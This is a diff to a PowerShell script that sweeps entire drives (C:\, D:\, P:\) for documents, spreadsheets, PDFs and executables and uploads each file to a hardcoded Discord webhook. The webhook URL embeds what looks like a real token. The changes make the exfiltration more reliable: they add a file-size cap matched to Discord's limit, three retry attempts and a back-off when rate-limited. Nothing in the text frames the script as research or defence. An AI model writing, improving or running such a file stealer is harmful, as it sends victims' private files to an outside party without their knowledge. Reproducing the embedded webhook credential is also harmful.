@@ -1,5 +1,6 @@
 $DiscordWebhookURL = "https://discord.com/api/webhooks/1313922889237528606/_sIv-aVxYQgrgpSYJD-oh-pmQYX8Dk_ctVzRH6eXxy_poCzc7WenyDxp_WnbaGRwVA0i"
 $FileExtensions = @(".txt", ".pdf", ".csv", ".doc", ".docx", ".xlsx", ".exe")
+$MaxFileSizeMB = 8  # Discord's maximum file size limit
 
 function Get-MimeType {
     param (
@@ -23,19 +24,37 @@ function Send-FileToDiscord {
         [string]$FilePath
     )
 
-    try {
-        $FileName = Split-Path -Leaf $FilePath
-        $MimeType = Get-MimeType -FilePath $FilePath
+    for ($attempt = 1; $attempt -le 3; $attempt++) {
+        try {
+            $FileName = Split-Path -Leaf $FilePath
+            $FileSizeMB = ([System.IO.FileInfo]$FilePath).Length / 1MB
 
-        # Create multipart form-data for the file upload
-        $Body = @{
-            file = [System.IO.File]::ReadAllBytes($FilePath)
+            if ($FileSizeMB -gt $MaxFileSizeMB) {
+                Write-Host "File too large to send to Discord: $FileName ($FileSizeMB MB)" -ForegroundColor Yellow
+                return
+            }
+
+            $MimeType = Get-MimeType -FilePath $FilePath
+
+            # Build multipart form-data for file upload
+            $Headers = @{ "Content-Type" = "multipart/form-data" }
+            $Body = @{
+                file = [System.IO.File]::ReadAllBytes($FilePath)
+            }
+
+            $Response = Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Body $Body -Headers $Headers
+            Write-Host "Sent file to Discord: $FileName" -ForegroundColor Green
+            Write-Host "Response from Discord: $Response" -ForegroundColor Cyan
+            return
+        } catch {
+            Write-Host "Attempt $attempt: Failed to send $FilePath to Discord: $_" -ForegroundColor Yellow
+            if ($_.Exception.Response.StatusCode -eq 429) {
+                # Wait and retry if rate-limited
+                Start-Sleep -Seconds 5
+            } else {
+                return
+            }
         }
-
-        Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Body $Body -ContentType "multipart/form-data"
-        Write-Host "Sent file to Discord: $FileName" -ForegroundColor Green
-    } catch {
-        Write-Host "Failed to send $FilePath to Discord: $_" -ForegroundColor Red
     }
 }
 
@@ -76,7 +95,7 @@ function Main {
         return
     }
 
-    # Hardcode the target directories
+    # Hardcoded target directories
     $TargetDirectories = @("C:\", "D:\", "P:\")
 
     Write-Host "Scanning directories: $TargetDirectories"
